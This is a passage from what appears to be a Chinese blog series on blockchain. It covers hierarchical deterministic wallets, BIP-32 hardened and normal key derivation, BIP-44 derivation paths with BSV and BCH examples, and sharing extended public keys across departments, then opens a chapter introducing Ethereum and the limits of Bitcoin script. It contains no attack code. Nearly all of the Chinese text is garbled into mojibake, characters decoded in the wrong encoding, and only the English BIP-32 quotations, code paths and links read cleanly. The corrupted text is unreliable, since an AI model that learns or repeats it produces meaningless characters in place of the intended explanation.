<p>å› æ­¤ï¼Œå¼ºåŒ–çš„å­å¯†é’¥çš„åº”ç”¨åœºæ™¯æ²¡æœ‰æ­£å¸¸ç”Ÿæˆçš„å­å¯†é’¥å¤šã€‚ä½†æ˜¯å¯ä»¥é˜²å¾¡ä¸Šé¢çš„æ”»å‡»ã€‚</p>
<p>mè¡¨ç¤ºç§é’¥ï¼ŒMè¡¨ç¤ºå…¬é’¥ï¼›æœ‰å°æ’‡å·çš„è¡¨ç¤ºå¼ºåŒ–çš„å­å¯†é’¥ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233061.jpg" alt="img"></p>
<p>HDé’±åŒ…æ ‘çŠ¶ç»“æ„æä¾›äº†æå¤§çš„çµæ´»æ€§ã€‚æ¯ä¸€ä¸ªæ¯æ‰©å±•å¯†é’¥æœ‰40äº¿ä¸ªå­å¯†é’¥ï¼š20äº¿ä¸ªå¸¸è§„å­å¯†é’¥å’Œ20äº¿ä¸ªå¼ºåŒ–å­å¯†é’¥ã€‚ è€Œæ¯ä¸ªå­å¯†é’¥åˆä¼šæœ‰40äº¿ä¸ªå­å¯†é’¥å¹¶ä¸”ä»¥æ­¤ç±»æ¨ã€‚åªè¦ä½ æ„¿æ„ï¼Œè¿™ä¸ªæ ‘ç»“æ„å¯ä»¥æ— é™ç±»æ¨åˆ°æ— ç©·ä»£ã€‚ä½†æ˜¯ï¼Œåˆç”±äºæœ‰äº†è¿™ä¸ªçµæ´»æ€§ï¼Œå¯¹æ— é™çš„æ ‘çŠ¶ç»“æ„è¿›è¡Œå¯¼èˆªå°±å˜å¾—å¼‚å¸¸å›°éš¾ã€‚ä¸ºäº†èƒ½æ–¹ä¾¿è¡¨ç¤ºå¯†é’¥é—´å…³ç³»ï¼Œå®šä¹‰äº†è¡ç”Ÿè·¯å¾„ï¼ˆDerivation Pathï¼‰çš„æ¦‚å¿µã€‚</p>
<ul>
<li>åºå·ä¹‹é—´ä»¥<code>/</code>åˆ†éš”</li>
<li><code>m</code>è¡¨ç¤ºä¸»å¯†é’¥</li>
<li><code>i</code>è¡¨ç¤ºç¬¬ iä¸ªå¸¸è§„è¡ç”Ÿçš„å­å¯†é’¥ï¼Œå³ç¬¬ iä¸ªå­å¯†é’¥</li>
<li><code>i&#39;</code>è¡¨ç¤ºç¬¬ iä¸ªç¡¬åŒ–è¡ç”Ÿçš„å­å¯†é’¥ï¼Œå³ç¬¬ (2^31+i) ä¸ªå­å¯†é’¥</li>
</ul>
<p><code>m/0&#39;/1&#39;/2</code>è¡¨ç¤ºä¸»å¯†é’¥çš„ç¬¬ 0 ä¸ªå¼ºåŒ–è¡ç”Ÿå­å¯†é’¥çš„ç¬¬ 1 ä¸ªå¼ºåŒ–è¡ç”Ÿå­å¯†é’¥çš„ç¬¬ 2 ä¸ªå¸¸è§„è¡ç”Ÿå­å¯†é’¥ï¼ˆæ ‘å½¢ç»“æ„ï¼‰ã€‚</p>
<p>æ‰©å±•å¯†é’¥åŠ ä¸Šè¡ç”Ÿè·¯å¾„ï¼Œå¯ä»¥ç¡®å®š HD é’±åŒ…é‡Œçš„ä¸€ä¸ªå¯†é’¥åŠä»è¿™ä¸ªå¯†é’¥è¡ç”Ÿçš„ä¹‹åæ‰€æœ‰å±‚çš„å­å¯†é’¥ï¼ˆä»¥è¿™ä¸ªå¯†é’¥ä¸ºæ ¹çš„å­æ ‘ï¼‰ã€‚</p>
<p>BIP-44æè®®äº†å¤šè´¦æˆ·ç»“æ„ä½œä¸ºâ€œpurposeâ€ã€‚æ‰€æœ‰éµå¾ªBIP-44çš„HDé’±åŒ…ä¾æ®åªä½¿ç”¨æ ‘çš„ç¬¬ä¸€ä¸ªåˆ†æ”¯çš„è¦æ±‚è€Œè¢«å®šä¹‰ï¼šm&#x2F;44â€™&#x2F;ã€‚ BIP-44æŒ‡å®šäº†åŒ…å«5ä¸ªé¢„å®šä¹‰æ ‘çŠ¶å±‚çº§çš„ç»“æ„ï¼š</p>
<p>m &#x2F; purposeâ€™ &#x2F; coin_typeâ€™ &#x2F; accountâ€™ &#x2F; change &#x2F; address_index</p>
<p>ç¬¬ä¸€å±‚çš„purposeæ€»æ˜¯è¢«è®¾å®šä¸º44â€™ã€‚</p>
<p>ç¬¬äºŒå±‚çš„â€œcoin_typeâ€ç‰¹æŒ‡å¸ç§å¹¶ä¸”å…è®¸å¤šå…ƒè´§å¸HDé’±åŒ…ä¸­çš„è´§å¸åœ¨ç¬¬äºŒä¸ªå±‚çº§ä¸‹æœ‰è‡ªå·±çš„äºšæ ‘çŠ¶ç»“æ„ã€‚ç›®å‰æœ‰ä¸‰ç§è´§å¸è¢«å®šä¹‰ï¼šBitcoin is m&#x2F;44â€™&#x2F;0â€™ã€Bitcoin Testnet is m&#x2F;44â€™&#x2F;1â€™ï¼Œä»¥åŠ Litecoin is m&#x2F;44â€™&#x2F;2â€™ã€‚</p>
<p>æ ‘çš„ç¬¬ä¸‰å±‚çº§æ˜¯â€œaccountâ€ï¼Œè¿™å¯ä»¥å…è®¸ä½¿ç”¨è€…ä¸ºäº†ä¼šè®¡æˆ–è€…ç»„ç»‡ç›®çš„ï¼Œè€Œå»å†ç»†åˆ†ä»–ä»¬çš„é’±åŒ…åˆ°ç‹¬ç«‹çš„é€»è¾‘æ€§äºšè´¦æˆ·ã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œä¸€ä¸ªHDé’±åŒ…å¯èƒ½åŒ…å«ä¸¤ä¸ªæ¯”ç‰¹å¸â€œè´¦æˆ·â€ï¼šm&#x2F;44â€™&#x2F;0â€™&#x2F;0â€™ å’Œ m&#x2F;44â€™&#x2F;0â€™&#x2F;1â€™ã€‚æ¯ä¸ªè´¦æˆ·éƒ½æ˜¯å®ƒè‡ªå·±äºšæ ‘çš„æ ¹ã€‚</p>
<p>ç¬¬å››å±‚çº§å°±æ˜¯â€œchangeâ€ã€‚æ¯ä¸€ä¸ªHDé’±åŒ…æœ‰ä¸¤ä¸ªäºšæ ‘ï¼Œä¸€ä¸ªæ˜¯ç”¨æ¥æ¥æ”¶åœ°å€ï¼Œä¸€ä¸ªæ˜¯ç”¨æ¥åˆ›é€ æ‰¾é›¶åœ°å€ã€‚æ³¨æ„æ— è®ºå…ˆå‰çš„å±‚çº§æ˜¯å¦ä½¿ç”¨å¼ºåŒ–è¡ç”Ÿï¼Œè¿™ä¸€å±‚çº§ä½¿ç”¨çš„éƒ½æ˜¯å¸¸è§„è¡ç”Ÿã€‚è¿™æ˜¯ä¸ºäº†å…è®¸è¿™ä¸€å±‚çº§çš„æ ‘å¯ä»¥åœ¨ä¸å®‰å…¨ç¯å¢ƒä¸‹ï¼Œè¾“å‡ºæ‰©å±•å…¬é’¥ã€‚</p>
<p>è¢«HDé’±åŒ…è¡ç”Ÿçš„å¯ç”¨çš„åœ°å€æ˜¯ç¬¬å››å±‚çº§çš„å­çº§ï¼Œå°±æ˜¯ç¬¬äº”å±‚çº§çš„æ ‘çš„â€œaddress_indexâ€ã€‚æ¯”å¦‚ï¼Œç¬¬ä¸‰ä¸ªä¸»è´¦æˆ·æ¥æ”¶æ¯”ç‰¹å¸æ”¯ä»˜çš„åœ°å€å°±æ˜¯ M&#x2F;44â€™&#x2F;0â€™&#x2F;0â€™&#x2F;0&#x2F;2ã€‚</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼š</p>
<p>ç”¨æˆ·åˆå§‹åŒ–äº†ä¸€ä¸ª HD é’±åŒ…ï¼Œä½¿ç”¨è¡ç”Ÿè·¯å¾„<code>m/44&#39;/236&#39;/0&#39;</code>ä½œä¸ºå­˜æ”¾ Bitcoin SVï¼ˆBSVï¼‰çš„â€œè´¦æˆ·â€ï¼Œé‚£ä¹ˆï¼Œ</p>
<ul>
<li>ç¬¬ä¸€ä¸ªæ”¶æ¬¾åœ°å€æ˜¯å…¬é’¥<code>m/44&#39;/236&#39;/0&#39;/0/0</code>å¯¹åº”çš„åœ°å€ï¼Œç¬¬äºŒä¸ªæ”¶æ¬¾åœ°å€æ˜¯å…¬é’¥<code>m/44&#39;/236&#39;/0&#39;/0/1</code>å¯¹åº”çš„åœ°å€ï¼Œä»¥æ­¤ç±»æ¨</li>
<li>å½“å®Œæˆç¬¬ä¸€æ¬¡æ”¯ä»˜å¹¶å­˜åœ¨æ‰¾é›¶æ—¶ï¼Œä¼šæ‰¾é›¶åˆ°åœ°å€<code>m/44&#39;/236&#39;/0&#39;/1/0</code>ï¼Œä¸‹ä¸€æ¬¡æ”¯ä»˜æ‰¾é›¶åˆ°çš„åœ°å€ä¼šæ˜¯<code>m/44&#39;/236&#39;/0&#39;/1/1</code>ï¼Œä»¥æ­¤ç±»æ¨</li>
<li>å¦‚æœæƒ³å†æ–°å»ºä¸€ä¸ª BSV â€œè´¦æˆ·â€å¦ä½œä»–ç”¨ï¼Œå¯ä»¥ä½¿ç”¨è·¯å¾„<code>m/44&#39;/236&#39;/1&#39;</code></li>
<li>å¦‚æœè¿˜æƒ³ç”¨è¿™ä¸ª HD é’±åŒ…å­˜æ”¾ BCHï¼Œå¯ä»¥ä½¿ç”¨è·¯å¾„<code>m/44&#39;/145&#39;/0&#39;</code></li>
</ul>
<h3 id="HD-é’±åŒ…çš„ä¼˜åŠ¿"><a href="#HD-é’±åŒ…çš„ä¼˜åŠ¿" class="headerlink" title="HD é’±åŒ…çš„ä¼˜åŠ¿"></a>HD é’±åŒ…çš„ä¼˜åŠ¿</h3><p>HD é’±åŒ…åœ¨å¤‡ä»½æ—¶ååˆ†æ–¹ä¾¿ã€‚</p>
<ul>
<li>åªéœ€è¦å¤‡ä»½<strong>åŠ©è®°è¯</strong>å’Œ<strong>å¯†è¯­</strong>ï¼Œå°±ç­‰äºå¤‡ä»½äº†æ•´ä¸ªé’±åŒ…å†…çš„æ‰€æœ‰ç§é’¥</li>
<li>é™¤æ­¤ä¹‹å¤–ï¼Œä½ è¿˜è¦è®°ä¸‹ä½¿ç”¨çš„<strong>è¡ç”Ÿè·¯å¾„</strong>ï¼Œè¿™æ ·æ‰èƒ½çŸ¥é“ä½¿ç”¨äº†å“ªäº›ç§é’¥</li>
</ul>
<p>å¦å¤–ï¼Œä»æ‰©å±•å…¬é’¥å¯ä»¥å¸¸è§„è¡ç”Ÿå­å…¬é’¥åŠå¯¹åº”åœ°å€è€Œä¸ç”¨è®¿é—®æ‰©å±•ç§é’¥æˆ–ç§é’¥æœ¬èº«ï¼Œè¿™æ˜¯ HD é’±åŒ…ä¸€ä¸ªå¾ˆé‡è¦çš„å®‰å…¨ç‰¹æ€§ã€‚</p>
<p>å¯†é’¥é—´çš„æ ‘å½¢ç»“æ„ï¼Œä¸æœºæ„çš„éƒ¨é—¨è®¾ç½®ååˆ†ç›¸ä¼¼ï¼Œå¦‚æœä¸€å®¶ä¼ä¸šå‡†å¤‡ä½¿ç”¨æ¯”ç‰¹å¸è¿›è¡Œè´¢åŠ¡æ”¶æ”¯ï¼Œå¯ä»¥ï¼š</p>
<ul>
<li><p>å°†è·¯å¾„<code>m/0&#39;/0&#39;/x&#39;</code>çš„æ‰©å±•å…¬é’¥äº¤ç»™å„é”€å”®éƒ¨é—¨ç‹¬è‡ªç®¡ç†å’Œä½¿ç”¨</p>
</li>
<li><ul>
<li>é”€å”®éƒ¨é—¨å¯ä»¥ä¸ºæ¯ç¬”è®¢å•ç”Ÿæˆä¸åŒçš„æ”¶æ¬¾åœ°å€ï¼Œæ–¹ä¾¿çŠ¶æ€è·Ÿè¸ª</li>
<li>å› ä¸ºä»æ‰©å±•å…¬é’¥æ— æ³•è¡ç”Ÿå‡ºå­ç§é’¥ï¼Œæ‰€ä»¥é”€å”®éƒ¨é—¨åªèƒ½æ”¶æ¬¾è€Œæ— æ³•æ”¯ä»˜è´¦æˆ·é‡Œçš„æ¯”ç‰¹å¸</li>
</ul>
</li>
<li><p>å°†è·¯å¾„<code>m/0&#39;/0&#39;</code>çš„æ‰©å±•å…¬é’¥äº¤ç»™å¸‚åœºéƒ¨ï¼Œå¸‚åœºéƒ¨å¯ä»¥æŸ¥é˜…æ‰€æœ‰è®¢å•çš„é”€å”®è®°å½•ï¼ŒåŒæ ·æ— æ³•æ”¯ä»˜æ¯”ç‰¹å¸</p>
</li>
<li><p>å°†è·¯å¾„<code>m/0&#39;/0&#39;</code>çš„æ‰©å±•ç§é’¥äº¤ç»™è´¢åŠ¡éƒ¨ï¼Œè´¢åŠ¡éƒ¨å¯ä»¥ç”¨è¿™ä¸ªæ›´ä¸Šå±‚çš„æ‰©å±•ç§é’¥ï¼Œç®¡ç†æ•´ä¸ªå…¬å¸çš„åŠ å¯†èµ„äº§</p>
</li>
</ul>
<p>é…åˆ <a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0045.mediawiki">BIP-45</a> å®šä¹‰çš„ HD é’±åŒ…å¤šç­¾æ–¹æ¡ˆï¼Œå¯ä»¥æ–¹ä¾¿ã€å®‰å…¨ã€çµæ´»çš„ç®¡ç†å…¬å¸çš„åŠ å¯†èµ„äº§ã€‚</p>
<p>ç»ƒä¹ ï¼ˆå¤©ä¹¦èˆ¬çš„<a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki">bip32</a>ï¼‰</p>
<p>The function CKDpriv((kpar, cpar), i) â†’ (ki, ci) computes a child extended private key from the parent extended private keyä»çˆ¶æ‰©å±•ç§é’¥è®¡ç®—å­æ‰©å±•ç§é’¥:</p>
<p>The function CKDpub((Kpar, cpar), i) â†’ (Ki, ci) computes a child extended public key from the parent extended public key. It is only defined for non-hardened child keys.ä»çˆ¶æ‰©å±•å…¬é’¥è®¡ç®—å­æ‰©å±•å…¬é’¥ã€‚å®ƒåªå®šä¹‰ä¸ºéhardened child</p>
<p>The function N((k, c)) â†’ (K, c) computes the extended public key corresponding to an extended private key (the â€œneuteredâ€ version, as it removes the ability to sign transactions).è®¡ç®—ä¸æ‰©å±•ç§é’¥å¯¹åº”çš„æ‰©å±•å…¬é’¥(â€œneuteredâ€ç‰ˆæœ¬ï¼Œå› ä¸ºå®ƒåˆ é™¤äº†ç­¾ç½²äº¤æ˜“çš„èƒ½åŠ›)ã€‚</p>
<p>The function N((k, c)) â†’ (K, c) computes the extended public key corresponding to an extended private key</p>
<p>To compute the public child key of a parent private key:è¦è®¡ç®—çˆ¶ç§é’¥çš„å…¬ç”¨å­å¯†é’¥</p>
<ul>
<li>N(CKDpriv((kpar, cpar), i)) (works always).</li>
<li>CKDpub(N(kpar, cpar), i) (works only for non-hardened child keys).ä»…é€‚ç”¨äºéç¡¬åŒ–å­å¯†é’¥</li>
</ul>
<p>Child key derivation (CKD) ï¼šThe function CKDpriv((kpar, cpar), i) â†’ (ki, ci) computes a child extended private key from the parent extended private keyï¼Œfunction CKDpub((Kpar, cpar), i) â†’ (Ki, ci) computes a child extended public key from the parent extended public keyã€‚</p>
<p>To shorten notation, we will write CKDpriv(CKDpriv(CKDpriv(m,3H),2),5) as m&#x2F;3H&#x2F;2&#x2F;5. Equivalently for public keys, we write CKDpub(CKDpub(CKDpub(M,3),2),5) as M&#x2F;3&#x2F;2&#x2F;5. This results in the following identities:</p>
<ul>
<li>N(m&#x2F;a&#x2F;b&#x2F;c) &#x3D; N(m&#x2F;a&#x2F;b)&#x2F;c &#x3D; N(m&#x2F;a)&#x2F;b&#x2F;c &#x3D; N(m)&#x2F;a&#x2F;b&#x2F;c &#x3D; M&#x2F;a&#x2F;b&#x2F;c.</li>
<li>N(m&#x2F;aH&#x2F;b&#x2F;c) &#x3D; N(m&#x2F;aH&#x2F;b)&#x2F;c &#x3D; N(m&#x2F;aH)&#x2F;b&#x2F;c.</li>
</ul>
<p>However, N(m&#x2F;aH) cannot be rewritten as N(m)&#x2F;aH, as the latter is not possible.</p>
<p>å‚è€ƒï¼š</p>
<ol>
<li><a href="https://link.zhihu.com/?target=https://bitcoinchallenge.codes/">Bitcoin Challenge</a></li>
<li><a href="https://link.zhihu.com/?target=https://bitcoiner.today/en/bitcoin-challenge-310-btc-clues-to-its-resolution-i/">Bitcoin Challenge 310 BTC: Clues to its resolution (I) - bitcoiner today</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.youtube.com/watch?v=Vbzwkl4MlLs">https://www.youtube.com/watch?v=Vbzwkl4MlLs</a></li>
<li><a href="https://link.zhihu.com/?target=http://book.8btc.com/books/6/masterbitcoin2cn/_book/ch05.html">ç¬¬äº”ç«  é’±åŒ… Â· å·´æ¯”ç‰¹å›¾ä¹¦</a></li>
<li><a href="https://link.zhihu.com/?target=https://bitcoin.org/en/developer-guide%23hierarchical-deterministic-key-creation">Developer Guide - Bitcoin</a></li>
<li><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki">bitcoin&#x2F;bips</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.chainnews.com/articles/145568296316.htm">https://www.chainnews.com/articles/145568296316.htm</a></li>
<li><a href="https://link.zhihu.com/?target=https://aaron67.cc/2019/01/22/bitcoin-wallet/">https://aaron67.cc/2019/01/22/bitcoin-wallet/</a></li>
</ol>
<h1 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h1><ol>
<li>å…¨è´¦æœ¬èŠ‚ç‚¹ä¸ºä»€ä¹ˆè¦å‘spvèŠ‚ç‚¹æä¾›merkleè·¯å¾„æœåŠ¡</li>
<li>ç”¨æˆ·æä¾›è¿™ç¬”è¾“å…¥æ‰€åœ¨çš„åŒºå—ï¼Œä»¥åŠè¿™ç¬”äº¤æ˜“åœ¨ç¬¬ä¸€å‡ ç¬”äº¤æ˜“ï¼Œç”¨æˆ·æ€ä¹ˆé€šè¿‡è‡ªå·±çš„å…¬é’¥æ‰¾åˆ°è¿™ä¸ªåŒºå—hashï¼Ÿæ˜¯éå†å—</li>
<li>çŸ¿å·¥æ€ä¹ˆéªŒè¯è¿™ç¬”è¾“å…¥æœ‰æ•ˆï¼Œé€ä¸€éå†å—ï¼Ÿ</li>
<li></li>
</ol>
<h1 id="åŒºå—é“¾æŠ€æœ¯11-ä»¥å¤ªåŠä»‹ç»"><a href="#åŒºå—é“¾æŠ€æœ¯11-ä»¥å¤ªåŠä»‹ç»" class="headerlink" title="åŒºå—é“¾æŠ€æœ¯11:ä»¥å¤ªåŠä»‹ç»"></a>åŒºå—é“¾æŠ€æœ¯11:ä»¥å¤ªåŠä»‹ç»</h1><p>ä»è¿™ä¸€èŠ‚å¼€å§‹ï¼Œæˆ‘ä»¬å‡†å¤‡ä»‹ç»ä¸¤ä¸ªå¯¹æ¯”ç‰¹å¸çš„é‡å¤§å˜åŒ–ï¼Œä»¥å¤ªåŠå’ŒEOSã€‚</p>
<p>ä»¥å¤ªåŠçš„æ¦‚å¿µé¦–æ¬¡åœ¨2013è‡³2014å¹´é—´ç”±ç¨‹åºå‘˜Vitalik Buterinå—æ¯”ç‰¹å¸å¯å‘åæå‡ºï¼Œå¤§æ„ä¸ºâ€œä¸‹ä¸€ä»£åŠ å¯†è´§å¸ä¸å»ä¸­å¿ƒåŒ–åº”ç”¨å¹³å°â€ï¼Œåœ¨2014å¹´é€šè¿‡ICOä¼—ç­¹å¼€å§‹å¾—ä»¥å‘å±•ã€‚æˆªè‡³2018å¹´2æœˆï¼Œä»¥å¤ªå¸æ˜¯å¸‚å€¼ç¬¬äºŒé«˜çš„åŠ å¯†è´§å¸ï¼Œä»…æ¬¡äºæ¯”ç‰¹å¸ã€‚å¯ä»¥æŸ¥çœ‹å‚è€ƒ[<a href="https://link.zhihu.com/?target=https://ethfans.org/wikis/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%8E%86%E5%8F%B2">1]</a>äº†è§£ä»¥å¤ªåŠçš„å‘å±•å†å²ã€‚</p>
<p>ä»‹ç»å®Œä¹‹å‰å…³äºæ¯”ç‰¹å¸çš„å†…å®¹ä¹‹åï¼Œæˆ‘ä»¬åº”è¯¥å¯ä»¥çœ‹æ‡‚ä»¥å¤ªåŠç™½çš®ä¹¦å‰é¢ä¸€éƒ¨åˆ†çš„å†…å®¹äº†ã€‚ç™½çš®ä¹¦ä¸­å¯¹æ¯”ç‰¹å¸çš„é‡è¦æŠ€æœ¯å’Œç‰¹å¾ä½œäº†ä¸€ä¸ªå›é¡¾å’Œæ€»ç»“ã€‚å¤§å®¶å¯ä»¥è‡ªå·±çœ‹çœ‹è¿™ä¸ª<a href="https://link.zhihu.com/?target=https://bitcoin.org/files/bitcoin-paper/bitcoin_zh_cn.pdf">ç™½çš®ä¹¦</a>ï¼Œç¡®è®¤ä¸€ä¸‹è‡ªå·±ä¹‹å‰çš„å­¦ä¹ æ•ˆæœã€‚</p>
<p>é‚£æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä¸»è¦è®²çš„æ˜¯ä»å¯¹æ¯”ç‰¹å¸çš„ä»‹ç»ä¹‹åçš„å†…å®¹ï¼Œä¹Ÿå³ç™½çš®ä¹¦ä¸­å¯¹æ¯”ç‰¹å¸è„šæœ¬è¯­è¨€çš„é™åˆ¶çš„æè¿°ï¼Œé€šè¿‡åˆ†æä»¥å¤ªåŠå¯¹æ¯”ç‰¹å¸çš„ç¼ºé™·ï¼Œæˆ‘ä»¬æ¥ç†è§£ä»¥å¤ªåŠçš„ç‰¹å¾ã€‚<a href="https://link.zhihu.com/?target=https://ethfans.org/posts/ethereum-whitepaper/">ä»¥å¤ªåŠç™½çš®ä¹¦</a>ã€‚</p>
<p>æ¯”ç‰¹å¸ç³»ç»Ÿçš„è„šæœ¬è¯­è¨€å­˜åœ¨ä¸€äº›ä¸¥é‡çš„é™åˆ¶ï¼š</p>
<ul>
<li><strong>ç¼ºå°‘å›¾çµå®Œå¤‡æ€§</strong> â€“ è¿™å°±æ˜¯è¯´ï¼Œå°½ç®¡æ¯”ç‰¹å¸è„šæœ¬è¯­è¨€å¯ä»¥æ”¯æŒå¤šç§è®¡ç®—ï¼Œä½†æ˜¯å®ƒä¸èƒ½æ”¯æŒæ‰€æœ‰çš„è®¡ç®—ã€‚æœ€ä¸»è¦çš„ç¼ºå¤±æ˜¯å¾ªç¯è¯­å¥ã€‚ä¸æ”¯æŒå¾ªç¯è¯­å¥çš„ç›®çš„æ˜¯é¿å…äº¤æ˜“ç¡®è®¤æ—¶å‡ºç°æ— é™å¾ªç¯ã€‚ç†è®ºä¸Šï¼Œå¯¹äºè„šæœ¬ç¨‹åºå‘˜æ¥è¯´ï¼Œè¿™æ˜¯å¯ä»¥å…‹æœçš„éšœç¢ï¼Œå› ä¸ºä»»ä½•å¾ªç¯éƒ½å¯ä»¥ç”¨å¤šæ¬¡é‡å¤if è¯­å¥çš„æ–¹å¼æ¥æ¨¡æ‹Ÿï¼Œä½†æ˜¯è¿™æ ·åšä¼šå¯¼è‡´è„šæœ¬ç©ºé—´åˆ©ç”¨ä¸Šçš„ä½æ•ˆç‡ï¼Œä¾‹å¦‚ï¼Œå®æ–½ä¸€ä¸ªæ›¿ä»£çš„æ¤­åœ†æ›²çº¿ç­¾åç®—æ³•å¯èƒ½å°†éœ€è¦256æ¬¡é‡å¤çš„ä¹˜æ³•ï¼Œè€Œæ¯æ¬¡éƒ½éœ€è¦å•ç‹¬ç¼–ç ã€‚</li>
<li><strong>ä»·å€¼ç›²ï¼ˆValue-blindnessï¼‰</strong>ã€‚UTXOè„šæœ¬ä¸èƒ½ä¸ºè´¦æˆ·çš„å–æ¬¾é¢åº¦æä¾›ç²¾ç»†çš„çš„æ§åˆ¶ã€‚ä¾‹å¦‚ï¼Œé¢„è¨€æœºåˆçº¦ï¼ˆoracle contractï¼‰çš„ä¸€ä¸ªå¼ºå¤§åº”ç”¨æ˜¯å¯¹å†²åˆçº¦ï¼ŒAå’ŒBå„è‡ªå‘å¯¹å†²åˆçº¦ä¸­å‘é€ä»·å€¼1000ç¾å…ƒçš„æ¯”ç‰¹å¸ï¼Œ30å¤©ä»¥åï¼Œè„šæœ¬å‘Aå‘é€ä»·å€¼1000ç¾å…ƒçš„æ¯”ç‰¹å¸ï¼Œå‘Bå‘é€å‰©ä½™çš„æ¯”ç‰¹å¸ã€‚è™½ç„¶å®ç°å¯¹å†²åˆçº¦éœ€è¦ä¸€ä¸ªé¢„è¨€æœºï¼ˆoracleï¼‰å†³å®šä¸€æ¯”ç‰¹å¸å€¼å¤šå°‘ç¾å…ƒï¼Œä½†æ˜¯ä¸ç°åœ¨å®Œå…¨ä¸­å¿ƒåŒ–çš„è§£å†³æ–¹æ¡ˆç›¸æ¯”ï¼Œè¿™ä¸€æœºåˆ¶å·²ç»åœ¨å‡å°‘ä¿¡ä»»å’ŒåŸºç¡€è®¾æ–½æ–¹é¢æœ‰äº†å·¨å¤§çš„è¿›æ­¥ã€‚ç„¶è€Œï¼Œå› ä¸ºUTXOæ˜¯ä¸å¯åˆ†å‰²çš„ï¼Œä¸ºå®ç°æ­¤åˆçº¦ï¼Œå”¯ä¸€çš„æ–¹æ³•æ˜¯éå¸¸ä½æ•ˆåœ°é‡‡ç”¨è®¸å¤šæœ‰ä¸åŒé¢å€¼çš„UTXOï¼ˆä¾‹å¦‚å¯¹åº”äºæœ€å¤§ä¸º30çš„æ¯ä¸ªkï¼Œæœ‰ä¸€ä¸ª2^kçš„UTXO)å¹¶ä½¿é¢„è¨€æœºæŒ‘å‡ºæ­£ç¡®çš„UTXOå‘é€ç»™Aå’ŒBã€‚</li>
<li><strong>ç¼ºå°‘çŠ¶æ€</strong> â€“ UTXOåªèƒ½æ˜¯å·²èŠ±è´¹æˆ–è€…æœªèŠ±è´¹çŠ¶æ€ï¼Œè¿™å°±æ²¡æœ‰ç»™éœ€è¦ä»»ä½•å…¶å®ƒå†…éƒ¨çŠ¶æ€çš„å¤šé˜¶æ®µåˆçº¦æˆ–è€…è„šæœ¬ç•™å‡ºç”Ÿå­˜ç©ºé—´ã€‚è¿™ä½¿å¾—å®ç°å¤šé˜¶æ®µæœŸæƒåˆçº¦ã€å»ä¸­å¿ƒåŒ–çš„äº¤æ¢è¦çº¦æˆ–è€…ä¸¤é˜¶æ®µåŠ å¯†æ‰¿è¯ºåè®®ï¼ˆå¯¹ç¡®ä¿è®¡ç®—å¥–åŠ±éå¸¸å¿…è¦ï¼‰éå¸¸å›°éš¾ã€‚è¿™ä¹Ÿæ„å‘³ç€UTXOåªèƒ½ç”¨äºå»ºç«‹ç®€å•çš„ã€ä¸€æ¬¡æ€§çš„åˆçº¦ï¼Œè€Œä¸æ˜¯ä¾‹å¦‚å»ä¸­å¿ƒåŒ–ç»„ç»‡è¿™æ ·çš„æœ‰ç€æ›´åŠ å¤æ‚çš„çŠ¶æ€çš„åˆçº¦ï¼Œä½¿å¾—å…ƒåè®®éš¾ä»¥å®ç°ã€‚äºŒå…ƒçŠ¶æ€ä¸ä»·å€¼ç›²ç»“åˆåœ¨ä¸€èµ·æ„å‘³ç€å¦ä¸€ä¸ªé‡è¦çš„åº”ç”¨-å–æ¬¾é™é¢-æ˜¯ä¸å¯èƒ½å®ç°çš„ã€‚</li>
<li><strong>åŒºå—é“¾ç›²ï¼ˆBlockchain-blindnessï¼‰</strong>- UTXOçœ‹ä¸åˆ°åŒºå—é“¾çš„æ•°æ®ï¼Œä¾‹å¦‚éšæœºæ•°å’Œä¸Šä¸€ä¸ªåŒºå—çš„å“ˆå¸Œã€‚è¿™ä¸€ç¼ºé™·å‰¥å¤ºäº†è„šæœ¬è¯­è¨€æ‰€æ‹¥æœ‰çš„åŸºäºéšæœºæ€§çš„æ½œåœ¨ä»·å€¼ï¼Œä¸¥é‡åœ°é™åˆ¶äº†åšå½©ç­‰å…¶å®ƒé¢†åŸŸåº”ç”¨ã€‚</li>
</ul>
<p>åœ¨ç™½çš®ä¹¦ä¸­ï¼Œå¼•å…¥ä»¥å¤ªåŠçš„æ—¶å€™ï¼Œè¿™æ ·ä»‹ç»ï¼š</p>
<p>â€œä»¥å¤ªåŠçš„ç›®çš„æ˜¯åŸºäºè„šæœ¬ã€ç«äº‰å¸å’Œé“¾ä¸Šå…ƒåè®®ï¼ˆon-chain meta-protocolï¼‰æ¦‚å¿µè¿›è¡Œæ•´åˆå’Œæé«˜ï¼Œä½¿å¾—å¼€å‘è€…èƒ½å¤Ÿåˆ›å»ºä»»æ„çš„åŸºäºå…±è¯†çš„ã€å¯æ‰©å±•çš„ã€æ ‡å‡†åŒ–çš„ã€ç‰¹æ€§å®Œå¤‡çš„ã€æ˜“äºå¼€å‘çš„å’ŒååŒçš„åº”ç”¨ã€‚â€¦â€¦å¹¶ä¸”å› ä¸ºå›¾çµå®Œå¤‡æ€§ã€ä»·å€¼çŸ¥æ™“ï¼ˆvalue-awarenessï¼‰ã€åŒºå—é“¾çŸ¥æ™“ï¼ˆblockchain-awarenessï¼‰å’Œå¤šçŠ¶æ€æ‰€å¢åŠ çš„åŠ›é‡è€Œæ¯”æ¯”ç‰¹å¸è„šæœ¬æ‰€èƒ½æä¾›çš„æ™ºèƒ½åˆçº¦å¼ºå¤§å¾—å¤šã€‚â€</p>
